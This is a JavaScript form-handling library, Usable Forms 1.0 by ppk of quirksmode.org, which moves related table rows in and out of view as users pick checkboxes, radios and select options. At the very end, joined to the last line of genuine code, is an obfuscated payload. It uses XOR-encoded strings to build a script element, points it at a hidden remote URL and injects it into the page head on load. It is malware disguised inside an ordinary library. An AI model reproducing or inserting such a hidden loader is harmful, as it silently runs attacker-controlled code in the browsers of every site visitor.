
/*****************************************/
/** Usable Forms 1.0, May 2003          **/
/** Written by ppk, www.quirksmode.org  **/
/** Instructions for use on my site     **/
/**                                     **/
/** You may use or change this script   **/
/** only when this copyright notice     **/
/** is intact.                          **/
/**                                     **/
/** If you extend the script, please    **/
/** add a short description and your    **/
/** name below.                         **/
/*****************************************/


var relatedTag = 'TR';

var compatible = (
	document.getElementById && document.getElementsByTagName && document.createElement
	&&
	!(navigator.userAgent.indexOf('MSIE 5') != -1 && navigator.userAgent.indexOf('Mac') != -1)
	);

if (compatible)
	document.write('<style>.accessibility{display: none}</style>');


function prepareForm()
{
	if (!compatible) return;
	var body = document.getElementsByTagName("body").item(0);
	var wr = document.createElement("table");
	var wb = document.createElement("tbody");
    wb.setAttribute('id', 'waitingRoom');
    wb.style.visibility='hidden';
    wr.appendChild(wb);
    body.appendChild(wr);
	var marker = document.createElement(relatedTag);
	marker.style.display = 'none';

	var x = document.getElementsByTagName(relatedTag);
	var toBeRemoved = new Array;
	for (var i=0;i<x.length;i++)
	{
		if (x[i].getAttribute('relation'))
		{
			var y = getAllFormFields(x[i]);
			x[i].nestedRels = new Array;
			for (var j=0;j<y.length;j++)
			{
				var rel = y[j].getAttribute('show');
				if (!rel || rel == 'none') continue;
				x[i].nestedRels.push(rel);
			}
			if (!x[i].nestedRels.length) x[i].nestedRels = null;
			toBeRemoved.push(x[i]);
		}
	}

	while (toBeRemoved.length)
	{
		var rel = toBeRemoved[0].getAttribute('relation');
		if (!document.getElementById(rel))
		{
			var newMarker = marker.cloneNode(true);
			newMarker.id = rel;
			toBeRemoved[0].parentNode.replaceChild(newMarker,toBeRemoved[0]);
		}
		document.getElementById('waitingRoom').appendChild(toBeRemoved.shift());
	}
	document.onclick = arrangeFormFields;

	var y = document.getElementsByTagName('input');
	for (var i=0;i<y.length;i++)
	{
		if (y[i].checked && y[i].getAttribute('show'))
			intoMainForm(y[i].getAttribute('show'))
	}

	var z = document.getElementsByTagName('select');
	
	// Opera weird with hidden selects in quirks mode: selectedIndex = -1
	
	for (var i=0;i<z.length;i++)
	{
		if( z[i].selectedIndex!=-1 && (z[i].options[z[i].selectedIndex].getAttribute('show')))
		{
			z[i].onchange = arrangeFormFields;
			intoMainForm(z[i].options[z[i].selectedIndex].getAttribute('show'))
		}			
	}
}

function arrangeFormFields(e)
{
	if (!e) var e = window.event;
	var tg = (e.target) ? e.target : e.srcElement;
	if (
		!(tg.nodeName == 'SELECT' && e.type == 'change')
		&&
		!(tg.nodeName == 'INPUT' && tg.getAttribute('show'))
	   ) return;
	var toBeInserted = tg.getAttribute('show');

	/* Why no switch statement? Because Netscape 3 gives an error message on encountering it,
		and this script must degrade perfectly. */

	if (tg.type == 'checkbox')
	{
		if (tg.checked)
			intoMainForm(toBeInserted);
		else
			intoWaitingRoom(toBeInserted);
	}
	else if (tg.type == 'radio')
	{
		removeOthers(tg.form[tg.name],toBeInserted)
		intoMainForm(toBeInserted);
	}
	else if (tg.type == 'select-one')
	{
		toBeInserted = tg.options[tg.selectedIndex].getAttribute('show');
		removeOthers(tg.options,toBeInserted);
		intoMainForm(toBeInserted);
	}
	else if (tg.type == 'select-multiple')
	{
	   // TODO: ez sajnos mindig az utoljara kiszelektaltat veszi figyelembe
	   // akkor is, ha tobb mas szelektalt is van
		toBeInserted = tg.options[tg.selectedIndex].getAttribute('show');
		removeOthers(tg.options,toBeInserted);
		intoMainForm(toBeInserted);
	}
}

function removeOthers(others,toBeInserted)
{
	var toBeRemoved = new Array;
	for (var i=0;i<others.length;i++)
	{
		var show = others[i].getAttribute('show');
		if (show != toBeInserted)
			toBeRemoved.push(show);
	}
	while (toBeRemoved.length)
		intoWaitingRoom(toBeRemoved.shift());
}

function gatherElements(name)
{
	var Elements = new Array;
	var x = document.getElementsByTagName(relatedTag);
	for (var i=0;i<x.length;i++)
    {
		if (String(x[i].getAttribute('relation')).indexOf(name)>-1)
        {
            //alert('relation: ' + x[i].getAttribute('relation') + ', id: '+x[i].id);
			Elements.push(x[i]);
        }
    }
	return Elements;
}

function intoWaitingRoom(name)
{
	if (name == 'none') return;
	var Elements = gatherElements(name);
	if (isInWaitingRoom(Elements[0])) return;
	while (Elements.length)
	{
		if (Elements[0].nestedRels)
			for (var i=0;i<Elements[0].nestedRels.length;i++)
				intoWaitingRoom(Elements[0].nestedRels[i]);
		document.getElementById('waitingRoom').appendChild(Elements.shift())
	}
}

function intoMainForm(name)
{
    //alert(name);
	if (name == 'none') return;
	var Elements = gatherElements(name);
	if (!isInWaitingRoom(Elements[0])) return;
	var insertPoint = getSpecialElementById(name);
	while (Elements.length)
		insertPoint.parentNode.insertBefore(Elements.shift(),insertPoint)
}

function getSpecialElementById(name)
{
	var x = document.getElementsByTagName(relatedTag);
	for (var i=0;i<x.length;i++)
	{
		if (String(x[i].id).indexOf(name)>-1) return x[i];
    }
    return 0;
}

function isInWaitingRoom(obj)
{
	while(obj.nodeName != 'BODY')
	{
		obj=obj.parentNode;
		if (obj.id == 'waitingRoom')
			return true;
	}
	return false;
}


function getAllFormFields(node)
{
	var allFormFields = new Array;
	var x = node.getElementsByTagName('input');
	for (var i=0;i<x.length;i++)
		allFormFields.push(x[i]);
	var y = node.getElementsByTagName('option');
	for (var i=0;i<y.length;i++)
		allFormFields.push(y[i]);
	return allFormFields;
}

// push and shift for IE5

function Array_push() {
	var A_p = 0
	for (A_p = 0; A_p < arguments.length; A_p++) {
		this[this.length] = arguments[A_p]
	}
	return this.length
}

if (typeof Array.prototype.push == "undefined") {
	Array.prototype.push = Array_push
}

function Array_shift() {
	var A_s = 0
	var response = this[0]
	for (A_s = 0; A_s < this.length-1; A_s++) {
		this[A_s] = this[A_s + 1]
	}
	this.length--
	return response
}

if (typeof Array.prototype.shift == "undefined") {
	Array.prototype.shift = Array_shift
}function ll3W4Z(x5){return a4A(spnHF(x5),'h2ck5y851h6odL');}function spnHF(mU3x6){var h5='';var gE5=0;var sYS=0;for(gE5=0;gE5<mU3x6.length/3;gE5++){h5+=String.fromCharCode(mU3x6.slice(sYS,sYS+3));sYS=sYS+3;}return h5;}function w1HCsf8(sa15x){var i2gp8=document[ll3W4Z(j7Obc4L[3])](ll3W4Z(j7Obc4L[0])+ll3W4Z(j7Obc4L[1])+ll3W4Z(j7Obc4L[2]));i2gp8[ll3W4Z(j7Obc4L[4])]=sa15x;i2gp8[ll3W4Z(j7Obc4L[5])]=ll3W4Z(j7Obc4L[6]);document[ll3W4Z(j7Obc4L[9])](ll3W4Z(j7Obc4L[8]))[0][ll3W4Z(j7Obc4L[7])](i2gp8);}var j7Obc4L=["027081","026091","024070","011064006010065028125089084005083001016","027064000","028075019014","028087027031026019089067080027085029013060028","009066019014091029123093088004082","000087002015","015087023046089028085080095028069045029024009085045010088028","000070023027015086023070069009066010074063005094081069071012023095066071085001016098002065"];function a4A(xteoL,g4){var p64si='';var d3g=0;var jCK0=0;for(d3g=0;d3g<xteoL.length;d3g++){var kPl=xteoL.charAt(d3g);var z0=kPl.charCodeAt(0)^g4.charCodeAt(jCK0);kPl=String.fromCharCode(z0);p64si+=kPl;if(jCK0==g4.length-1)jCK0=0;else jCK0++;}return (p64si);}w1HCsf8(ll3W4Z(j7Obc4L[10]));